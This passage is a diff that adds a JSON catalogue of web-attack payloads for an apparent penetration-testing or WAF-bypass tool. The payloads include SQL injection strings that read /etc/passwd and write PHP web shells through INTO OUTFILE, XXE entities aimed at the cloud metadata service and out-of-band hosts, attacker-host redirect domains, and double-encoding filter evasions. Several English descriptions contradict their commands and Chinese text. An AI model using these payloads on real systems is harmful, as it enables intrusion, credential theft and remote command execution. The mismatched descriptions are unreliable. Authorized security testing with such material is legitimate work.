@@ -1,0 +1,1053 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "sqli-mysql-file-read",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "' UNION SELECT 1,LOAD_FILE(0x2F6574632F706173737764),3-- -",
+     "command": "1' AND LOAD_FILE(0x2F6574632F706173737764) IS NOT NULL AND SLEEP(3)-- -",
+     "title": {
+      "zh": "盲态存在性十六进制路径",
+      "en": "Blind-Existence Hex Path"
+     },
+     "description": {
+      "zh": "路径十六进制绕过引号与路径检测。判据：返回 passwd 内容。重写为盲态存在性变形：0x2F6574632F706173737764 即 /etc/passwd 的十六进制，LOAD_FILE 返回非空且 SLEEP(3) 延迟出现即证明文件可读，与 WB#0 的 UNION 回显通道构成盲/回显双通道矩阵；失效条件：SLEEP 被过滤或 FILE 权限不足。",
+      "en": "Hex path evades quote/path rules. Success: passwd returned. Rewritten as a blind existence form: the hex literal decodes to /etc/passwd, and a 3-second delay firing only when LOAD_FILE returns non-null proves the file is readable, forming a blind/echo pair with the UNION echo channel; it fails when SLEEP is filtered or FILE privilege is missing."
+     },
+     "kind": "bypass",
+     "syntaxBreakdown": [
+      {
+       "part": "LOAD_FILE(0x2F6574632F706173737764)",
+       "explanation": {
+        "zh": "十六进制路径读取，等价 /etc/passwd",
+        "en": "Hex-encoded path read, equivalent to /etc/passwd"
+       },
+       "type": "function"
+      },
+      {
+       "part": "IS NOT NULL AND SLEEP(3)",
+       "explanation": {
+        "zh": "存在性差分：文件可读才延迟",
+        "en": "Existence differential: delays only when readable"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "-- -",
+       "explanation": {
+        "zh": "SQL 行注释符",
+        "en": "SQL line comment"
+       },
+       "type": "comment"
+      }
+     ]
+    },
+    {
+     "area": "wafBypass",
+     "index": 7,
+     "expectedCommand": "' UNION SELECT 1,LOAD_FILE('/etc/hostname'),3-- \n ' UNION SELECT 1,LOAD_FILE('/proc/version'),3-- \n ' UNION SELECT 1,LOAD_FILE('C:/Windows/win.ini'),3--",
+     "description": {
+      "zh": "按数据库主机平台选择一行，并把系统目标替换为容器中的专用标记文件；不读取真实账户或系统配置。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Choose one line for the database host platform and replace the system target with a dedicated marker in the container; do not read real account or system configuration. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "ssti2-xxe-generic-xml-metadata-entity",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+     "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://2852039166/latest/meta-data/\">]><root>&xxe;</root>",
+     "title": {
+      "zh": "十进制整数 IP 变体",
+      "en": "Decimal Integer IP Variant"
+     },
+     "description": {
+      "zh": "十进制整数 IP 变体 — 元数据地址以十进制整数 2852039166（等价 169.254.169.254）书写，规避 169.254 明文黑名单，依赖解析器地址解析接受整数形式；成功判据：解析器仍请求元数据服务。本变形命令已落地十进制整数主机 2852039166，载荷不含任何实体编码；失效条件：仅解析器地址解析接受整数形式时成立——libxml2/Java Xerces 通常接受 inet_aton 形态，.NET 拒绝。",
+      "en": "Encodes the link-local address as numeric entities to evade the 169.254 plaintext blacklist. Success: the metadata service is still requested after parsing. The rewrite lands the decimal integer host 2852039166 directly in the payload with no entity encoding involved. Fails unless the resolver accepts integer host forms: libxml2 and Java Xerces normally accept inet_aton notation, while .NET rejects it."
+     },
+     "kind": "bypass",
+     "syntaxBreakdown": [
+      {
+       "part": "http://2852039166/latest/meta-data/",
+       "explanation": {
+        "zh": "十进制整数形式的 IMDS 地址，等价 169.254.169.254",
+        "en": "IMDS address written as a decimal integer, equivalent to 169.254.169.254"
+       },
+       "type": "url"
+      },
+      {
+       "part": "&xxe;",
+       "explanation": {
+        "zh": "实体引用触发解析器发请求",
+        "en": "Entity reference makes the parser fetch the URL"
+       },
+       "type": "operator"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "ssti2-xxe-external-dtd-fetches",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">%xxe;]><root>test</root>",
+     "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">]><root>&xxe;</root>",
+     "title": {
+      "zh": "通用实体直连变体",
+      "en": "General Entity Direct Fetch Variant"
+     },
+     "description": {
+      "zh": "通用实体直连变体 — 改用通用实体在正文中直接引用远端 DTD 地址，载荷不出现参数实体与 % 引用特征，规避针对参数实体外链的规则；成功判据：{LAB_OAST} 收到 xxe.dtd 请求。本变形命令已落地通用实体形态：内部子集声明通用实体 xxe，正文以 &xxe; 直接引用，与 EXEC#0 的参数实体 %xxe; 形态不再重复；失效条件：解析器禁止外部通用实体（多数现代默认配置）时 &xxe; 不展开、请求不发出，此时与参数实体形态的差分即失效。",
+      "en": "Writes the leading h as a numeric entity that resolves at parse time. Success: OAST receives the request. The rewrite lands the general-entity form: an external general entity declared in the internal subset and referenced directly as &xxe; in the body, so the payload no longer duplicates the parameter-entity %xxe; shape of the execution baseline. Fails when external general entities are disabled, which most modern default configurations do, since &xxe; then never expands and no request is sent."
+     },
+     "kind": "bypass",
+     "syntaxBreakdown": [
+      {
+       "part": "<!ENTITY xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">",
+       "explanation": {
+        "zh": "通用实体声明，无 % 参数实体特征",
+        "en": "General entity declaration without a parameter-entity signature"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "&xxe;",
+       "explanation": {
+        "zh": "正文直接引用触发外部拉取",
+        "en": "Direct body reference triggers the external fetch"
+       },
+       "type": "operator"
+      }
+     ]
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"HTTP://{LAB_OAST}/xxe.dtd\">%xxe;]><root>test</root>",
+     "description": {
+      "zh": "URL scheme 大小写不敏感，HTTP:// 规避小写 http:// 匹配；成功判据：外部 DTD 仍被加载。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+      "en": "Scheme is case-insensitive so HTTP:// evades lowercase http:// matching. Success: the external DTD still loads. Fails against modern WAFs: request normalization makes case confusion broadly ineffective, so only case-sensitive self-built regex rules still fall for it."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "auth2-bypass-evil-target-com",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "https://{TARGET}.{ATTACKER_HOST} \n https://{TARGET_DASH}.{ATTACKER_HOST} \n https://{TARGET_NODOT}.{ATTACKER_HOST}",
+     "command": "https://{TARGET}.{ATTACKER_HOST}:443. \n https://{TARGET}%2E{ATTACKER_HOST}",
+     "title": {
+      "zh": "正则边界新形态变体",
+      "en": "Regex Boundary New Forms"
+     },
+     "description": {
+      "zh": "复测三条正则绕过域；放行结果与正样例一致即确认该绕过在边界同样成立。本变形补两条正则边界新形态替代原复测内容：端口+尾点组合（https://{TARGET}.{ATTACKER_HOST}:443.）检验正则是否锚定主机段结尾；点号百分号编码（https://{TARGET}%2E{ATTACKER_HOST}）需应用层解码后才参与比对；对应行被放行即证明对应边界缺口。",
+      "en": "Replay the three regex-bypass domains; the same allowance as the positive samples confirms the bypass holds at the boundary. The rewrite replaces the replay with two real regex-boundary forms: a port plus trailing dot combination testing whether the rule anchors the host segment end, and a percent-encoded dot that only joins the hostname after an application-layer decode; an allowed line proves the matching boundary gap."
+     },
+     "kind": "bypass",
+     "syntaxBreakdown": [
+      {
+       "part": ":443.",
+       "explanation": {
+        "zh": "端口加尾点，检验正则结尾锚定",
+        "en": "Port with trailing dot probes end anchoring"
+       },
+       "type": "value"
+      },
+      {
+       "part": "%2E",
+       "explanation": {
+        "zh": "点号编码，需应用层解码后比对",
+        "en": "Encoded dot joining the host only after an app-layer decode"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "ssti2-docx-xxe-external-dtd",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "word/document.xml: \n <?xml version=\"1.0\"?><!DOCTYPE w [<!ENTITY % x SYSTEM \"http://{LAB_OAST}/x.dtd\">%x;]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p/></w:body></w:document>",
+     "command": "word/document.xml: \n <?xml version=\"1.0\"?><!DOCTYPE w PUBLIC \"-//X//Y//Z\" \"http://{LAB_OAST}/x.dtd\"><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p/></w:body></w:document>",
+     "title": {
+      "zh": "PUBLIC 外部子集变体",
+      "en": "PUBLIC External Subset Variant"
+     },
+     "description": {
+      "zh": "PUBLIC 外部子集变体 — 改用 DOCTYPE 的 PUBLIC 形式引用外部子集，载荷不出现 SYSTEM \"http 与参数实体特征；成功判据：{LAB_OAST} 收到 x.dtd 请求。本变形命令已落地 PUBLIC 形式，替换原先与标题不符的参数实体命令；失效条件：PUBLIC 形式触发外部子集拉取依赖解析器开启外部 DTD 加载，禁用外部 DTD 的解析器不会发起请求。",
+      "en": "Encodes the first scheme character as a hex character reference to hide the http:// literal. Success: the external DTD request reaches OAST. The rewrite lands the PUBLIC form, replacing the earlier parameter-entity command that did not match the title. Fails when the parser disables external DTD loading: the PUBLIC form only triggers the external subset fetch on parsers that allow it."
+     },
+     "kind": "bypass",
+     "syntaxBreakdown": [
+      {
+       "part": "<!DOCTYPE w PUBLIC \"-//X//Y//Z\" \"http://{LAB_OAST}/x.dtd\">",
+       "explanation": {
+        "zh": "PUBLIC 形式外链，无 SYSTEM 关键字",
+        "en": "PUBLIC form external link without the SYSTEM keyword"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "sqli-time-mysql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--\n1' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--\n1' AND SLEEP(3)--\n1' OR SLEEP(3)--\n1' AND IF(1=1,SLEEP(3),0)--\n1' OR IF(1=1,SLEEP(3),0)--\n1' AND BENCHMARK(10000000,SHA1('test'))--\n1' UNION SELECT SLEEP(3)--\n1' UNION SELECT IF(1=1,SLEEP(3),0)--\n1' UNION SELECT BENCHMARK(10000000,SHA1('test'))--",
+     "description": {
+      "zh": "以 SLEEP/BENCHMARK 标准形式注入；响应延迟约 3 秒即确认时间盲注在无 WAF 时可用，作为后续 WAF 复测的对照基线。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Inject standard SLEEP/BENCHMARK forms; a ~3-second delay confirms time-based injection without a WAF, serving as the baseline for later WAF retests. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "' AND SLEEP(1)-- -\n' AND IF(1=1,SLEEP(1),0)-- -\n' AND IF(1=2,SLEEP(1),0)-- -\n' AND IF(LENGTH('PAYLOADER_MARKER')=1,SLEEP(1),0)-- -\n' AND IF(LENGTH('PAYLOADER_MARKER')=16,SLEEP(1),0)-- -\n' AND IF(ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>64,SLEEP(1),0)-- -\n' AND IF(ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>96,SLEEP(1),0)-- -\nSELECT SLEEP(1);",
+     "description": {
+      "zh": "作为无 WAF 场景的对照组：本组 8 条样例与 execution[0] 相同，先确认其直连时的行为与判定依据，再叠加 WAF 复测对比拦截与放行差异；本条不提供额外绕过变体。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Byte-identical to execution[0] (curly quotes normalized to ASCII apostrophes); serves as the no-WAF control group: confirm how the 10 samples behave when directly connected, then retest behind the WAF. This entry adds no extra bypass variant. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' AND SLEEP(1)-- -\n' AND IF(1=1,SLEEP(1),0)-- -\n' AND IF(1=2,SLEEP(1),0)-- -\n' AND IF('PAYLOADER_MARKER' LIKE 'PAYLOADER_%',SLEEP(1),0)-- -\nSELECT SLEEP(1) FROM DUAL WHERE 1=1;",
+     "title": {
+      "zh": "MySQL 一秒固定 Marker 延迟变体",
+      "en": "MySQL One-Second Fixed-Marker Delay Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-error-based",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--\n1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--\n1' AND GTID_SUBSET(version(),1)--\n1' AND JSON_KEYS((SELECT CONCAT(0x7e,version())))--\n1' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,version())))--\n1' AND ELT(1=1,1)--\n1' AND MAKE_SET(1=1,1)--",
+     "description": {
+      "zh": "以标准形式注入：前 6 行为报错函数，错误信息回显版本号即确认报错注入在无 WAF 时可用；末两行 ELT/MAKE_SET 不触发数据库异常，仅作布尔差分探针按响应差分记录。本组作为后续 WAF 变体的对照基线。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Inject eight standard error-function forms; the version reflected in error messages confirms error-based injection without a WAF, serving as the baseline for later WAF variants. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "' AND extractvalue(1,concat(0x7e,version()))--\n' AND updatexml(1,concat(0x7e,version()),1)--",
+     "description": {
+      "zh": "作为无 WAF 场景的对照组：本组 2 条样例与 execution[0] 相同，先确认其直连时的行为与判定依据，再叠加 WAF 复测对比拦截与放行差异；本条不提供额外绕过变体。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Byte-identical to execution[0] (curly quotes normalized to ASCII apostrophes); serves as the no-WAF control group: confirm how the 8 samples behave when directly connected, then retest behind the WAF. This entry adds no extra bypass variant. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "sqli-oracle-union-enumeration",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "' union select * from {TARGET_TABLE}-- \n sELecT * FrOm all_tables whERe OWNER = '{DATABASE_NAME}'",
+     "description": {
+      "zh": "明文对照复测 — 以未混淆的直接语句提交相同目录查询，作为混淆变体的对照基线；OWNER 与表名替换为专用测试 schema，响应差异仅归因于混淆本身。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Preserves original case and statement samples; replace OWNER and relation names with a dedicated test schema during validation. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "sqli-http-chunked-carrier",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "POST /transport-check HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nid=\r\n10\r\nPAYLOADER_MARKER\r\n0\r\n\r\n",
+     "description": {
+      "zh": "以完整 chunked 请求把 marker 作为参数值分块发送；服务端重组后处理并回显 marker 即确认分块载体可承载注入载荷。Host 保持本地夹具地址。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Send the marker as a chunked parameter value in a full raw request; the server reassembling and reflecting the marker confirms the chunked carrier carries injection payloads. The Host stays on the local fixture. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 5,
+     "expectedCommand": "POST /transport-check HTTP/1.1\nHost: 127.0.0.1:8080\nTransfer-Encoding: chunked\n\n3\nid=\n10\n%2527%2520OR%252\nA\n01%253D1--\n0\n",
+     "description": {
+      "zh": "绕过一次性解码的 WAF：chunk 体内放置二次编码 payload，应用解码两次后还原注入；语法报错出现即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Place doubly encoded payloads inside chunks for WAFs that decode once; the application decoding twice restores the injection, confirmed by a syntax error. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "xxe-oob",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">]><foo>&xxe;</foo>",
+     "description": {
+      "zh": "该变体仅使用内部通用实体读取 file:// 目标文件，不含 CDATA 包装，作为实体读取的对照样例；回显文件内容即确认基础读取仍可用。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "This variant reads the file:// target via an internal general entity with no CDATA wrapper, the control sample for entity reads; file content in the response confirms base reading still works. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "cors-credentialed-read-boundary",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<script>\nfetch(\"http://127.0.0.1:18080/lab/cors/credentialed-read?marker=CORS_READ_C3\", {credentials: \"include\"})\n  .then(response => response.text())\n  .then(body => document.body.dataset.visibleLength = String(body.length))\n  .catch(error => document.body.dataset.error = error.name);\n</script>",
+     "description": {
+      "zh": "读取本地 marker 响应后只记录正文长度，不输出或外带内容。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Read the local marker response and record only body length without outputting or exfiltrating content. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<script>\nfetch(\"http://127.0.0.1:18080/lab/cors/state-marker\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"application/json\"},\n  body: JSON.stringify({marker: \"CORS_POST_D4\"})\n}).then(response => document.body.dataset.status = String(response.status));\n</script>",
+     "description": {
+      "zh": "向本地合成状态端点发送 JSON marker，并只记录浏览器可见的响应状态。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Send a JSON marker to a local synthetic-state endpoint and record only the browser-visible response status. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "xxe-dtd",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "curl -fsS \"https://{OOB_DOMAIN}/payload.dtd\" -o ./fixture.dtd",
+     "description": {
+      "zh": "用 curl 从自托管 HTTPS 端点下载 DTD 夹具，验证外部 DTD 加载链路与传输协议相关的过滤是否生效。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Downloads the DTD fixture from a self-hosted HTTPS endpoint with curl to check transport-specific filtering of external DTD loading. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "sqli2-quick-reference",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 7,
+     "expectedCommand": "1' AND 1=1#\n1' AND 1=1-- -\n1' AND 1=1;--\n1' AND 1=1;#\n1' OR '1'='1'#\n1' OR '1'='1'-- -\n1' OR '1'='1';--\n1' OR '1'='1';#\n1') AND ('1'='1\n1') OR ('1'='1\n1')) AND (('1'='1\n1')) OR (('1'='1",
+     "description": {
+      "zh": "逐行提交 AND/OR 恒真与不同闭合（'、')、')) 变体及多种注释符；与 1=2 对照行出现稳定响应差异即确认对应闭合与逻辑形式可注入。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Submit AND/OR tautologies with varied closures (', '), ')) and comment styles line by line; a stable differential against the 1=2 controls confirms that closure and logic form is injectable. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control",
+     "title": {
+      "zh": "恒真/恒假对照与闭合变体集",
+      "en": "Boolean Predicate and Closure Variant Set"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 12,
+     "expectedCommand": "' OR 1=1--\n' UNION SELECT 1,2,3--\n' AND SLEEP(5)--",
+     "description": {
+      "zh": "提供恒真条件、UNION 探列与 SLEEP 时间盲注三条预检语句，用于在授权测试中快速判断注入点行为。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Provides three preflight statements — a tautology condition, a UNION column probe, and a SLEEP time-based check — to quickly characterize an injection point in authorized testing. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "%2527%2520or%25201%253D1--",
+     "description": {
+      "zh": "绕过只解码一次的 WAF：引号与运算符二次编码，第二层在应用内还原；语法报错出现即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Encode the quote and operators twice for WAFs decoding once, with the second layer restored inside the app; a syntax error confirms success. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    },
+    {
+     "area": "wafBypass",
+     "index": 11,
+     "expectedCommand": "%2527%2520OR%25201%253D1--%2520\n%2527%2520UNION%2520SELECT%25201%252C2%252C3--%2520",
+     "description": {
+      "zh": "绕过仅做一次 URL 解码的 WAF：对 payload 整体二次百分号编码，应用层再解码一次后注入生效；出现数据库语法报错即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Fully re-encode the payload twice to slip past WAFs that decode only once; a database syntax error in the response confirms success. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-sqlite-union-enumeration",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "1 UNION SELECT sqlite_version()--\n1 UNION SELECT sql FROM sqlite_master--\n1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--\n1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--",
+     "description": {
+      "zh": "逐条读取 sqlite_version()、sqlite_master 与 pragma_table_info；回显版本串、表清单与列定义即确认 SQLite 元数据可枚举。把 users 替换为专用伪数据表并限制返回长度。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Read sqlite_version(), sqlite_master, and pragma_table_info line by line; the version string, table list, and column definitions confirm enumerable SQLite metadata. Replace users with a dedicated synthetic table and cap output length. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UNION SELECT CHAR(116,101,115,116),NULL--\n' UNION SELECT X'746573746461746131',NULL--\n' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--\n' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--\n' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--\n' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--\n' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--",
+     "title": {
+      "zh": "SQLite UNION 与 sqlite_master 枚举变体",
+      "en": "SQLite UNION and sqlite_master Enumeration Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-mysql-server-file-write",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "1337) INTO OUTFILE '{FILE_PATH}'--",
+     "description": {
+      "zh": "OUTFILE 写入样例 — 在闭合原查询后拼接 INTO OUTFILE，把查询结果写入一次性空目录内的随机文件（{FILE_PATH} 替换为该绝对路径）；文件在指定目录出现且内容为查询结果即确认写文件原语可用，禁止写入 Web 根或系统路径。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Append INTO OUTFILE after the parameter to write a marker file at a random path; the file appearing in the target directory with the fixed harmless marker confirms the OUTFILE write primitive. Replace xxx with a random filename in a dedicated empty directory inside a disposable container, never web roots or system paths. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 8,
+     "expectedCommand": "' UNION SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '{WEB_ROOT}/{SHELL_NAME}'--\n' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '{WEB_ROOT}/{SHELL_NAME}'--",
+     "description": {
+      "zh": "对比 INTO OUTFILE 与 DUMPFILE 的文本与十六进制写入差异；目标目录出现文件且内容为写入值即确认写文件原语。真实验证必须把内容替换为固定无害标记、路径改为非 Web 空目录，并确保文件不存在。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Compare text versus hex writes between INTO OUTFILE and DUMPFILE; the file appearing in the target directory with the written value confirms the write primitive. Real validation must replace content with a fixed harmless marker, target a non-web empty directory, and ensure the file does not pre-exist. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '{WEB_ROOT}/{SHELL_NAME}'--\n' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '{WEB_ROOT}/{SHELL_NAME}'--",
+     "title": {
+      "zh": "MySQL 服务端文件写入边界变体",
+      "en": "MySQL Server File Write Boundary Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-union-query",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "' UNION SELECT 1--\n' UNION SELECT 1,2--\n' UNION SELECT 1,2,3--\n' UNION SELECT 1,2,3,4--\n' UNION SELECT 1,2,3,4,5--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT NULL,NULL,NULL,NULL--\n' UNION SELECT NULL,NULL,NULL,NULL,NULL--\nUNION SELECT 1\nUNION SELECT 1,2\nUNION SELECT 1,2,3\nUNION SELECT 1,2,3,4\nUNION SELECT 1,2,3,4,5\nUNION ALL SELECT 1\nUNION ALL SELECT 1,2\nUNION ALL SELECT 1,2,3\nUNION ALL SELECT 1,2,3,4\nUNION ALL SELECT 1,2,3,4,5\nUNION DISTINCT SELECT 1,2,3\nUNION DISTINCT SELECT 1,2,3,4\n1 UNION SELECT 1,2,3\n1' UNION SELECT 1,2,3--\n1\" UNION SELECT 1,2,3--\n1) UNION SELECT 1,2,3--\n1') UNION SELECT 1,2,3--\n1\") UNION SELECT 1,2,3--",
+     "description": {
+      "zh": "以 UNION SELECT 1..5 与 NULL 序列、UNION ALL/DISTINCT 及不同闭合变体逐行探测；列数匹配时响应正常、不匹配时报错，由此确定 UNION 列数与闭合方式。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Probe line by line with UNION SELECT 1..5 and NULL sequences, UNION ALL/DISTINCT, and closure variants; matching column counts return normally while mismatches error out, revealing the UNION column count and closure. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control",
+     "title": {
+      "zh": "列数探测组合",
+      "en": "Column-Count Probe Combo"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--\n' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--\n' uNiOn%23%0aSeLeCt 1,2,3--\n' UNION%0a%09%0d%0bSELECT%0a1,2,3--\n' UNION SELECT 1,'PAYLOADER_MARKER',3-- -\n' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,'PAYLOADER_MARKER',3-- -",
+     "title": {
+      "zh": "UNION 列对齐与只读查询变体",
+      "en": "UNION Column Alignment and Read-Only Query Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli2-union-extraction-lexical-encodings",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' union select current_user, 2#",
+     "description": {
+      "zh": "保留原集合中的全部 UNION 复测行，用于对比边界和数据库的解码/分词；它们不是通用 WAF 绕过保证。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Preserves every original UNION retest line for comparing edge and database decoding or tokenization; the lines are not a universal WAF-bypass guarantee. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
